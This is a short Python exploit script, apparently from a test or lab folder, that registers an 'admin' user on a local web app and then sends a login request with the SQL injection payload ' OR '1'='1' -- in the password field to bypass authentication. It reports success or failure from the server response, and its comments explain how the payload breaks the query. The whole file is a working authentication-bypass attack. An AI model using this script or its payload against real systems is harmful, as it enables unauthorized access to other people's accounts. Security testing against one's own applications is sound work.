# exploit-scripts/sql_injection.py
import requests
import json

TARGET_URL = "http://localhost:8080/login"

def perform_sql_injection(username):
    # This payload closes the username string with ', then adds an OR condition
    # that is always true ('1'='1'). The '--' comments out the rest of the query.
    sqli_payload = f"' OR '1'='1' --"

    payload = {
        "username": username,
        "password": "any_fake_password" # The password doesn't matter
    }

    print(f"[*] Attempting SQL Injection on user: {username}")
    print(f"  [-] Using SQLi payload in password field: {sqli_payload}")

    # Let's inject into the password field
    payload["password"] = sqli_payload
    headers = {'Content-Type': 'application/json'}

    response = requests.post(TARGET_URL, data=json.dumps(payload), headers=headers)

    if response.status_code == 200 and "Login Successful" in response.text:
        print("\n[+] SQL INJECTION SUCCESSFUL!")
        print(f"[+] Logged in as the first user in the database (likely '{username}') without a valid password.")
        print(f"[+] Server Response: {response.text}")
    else:
        print("\n[-] SQL Injection failed.")
        print(f"[-] Status Code: {response.status_code}")
        print(f"[-] Server Response: {response.text}")

if __name__ == "__main__":
    # We need a user to exist in the DB for the query to return something.
    # Let's assume 'admin' or 'testuser' was created.
    username_to_target = "admin"
    register_payload = {"username": username_to_target, "password": "a_very_secure_password"}
    requests.post("http://localhost:8080/register", json=register_payload)
    print(f"[*] Registered user '{username_to_target}' to ensure a user exists.")

    perform_sql_injection(username_to_target)